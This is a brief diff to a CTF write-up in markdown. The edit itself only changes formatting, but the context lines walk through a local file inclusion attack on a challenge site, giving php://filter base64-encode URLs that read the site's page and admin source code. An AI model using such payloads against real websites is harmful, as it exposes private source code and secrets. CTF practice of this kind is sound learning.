@@ -20,7 +20,8 @@ date: 2023-01-31
 1. Observe: According to the URL, `http://h4ck3r.quest:8400/?page=inc/home`, it might have `LFI` problem.
 2. Use `php://filter` to read page
     * `http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home`
-    * source code
+    
+    source code
     ```php
     <!DOCTYPE html>
     <html lang="en">
@@ -68,7 +69,7 @@ date: 2023-01-31
     ```
 3. Observe page source code: We know that `admin.php` is under `/` directory.
     * `http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin`
-    :::spoiler admin source code
+
     ```php
     <h1>Admin Panel</h1>
     <form>
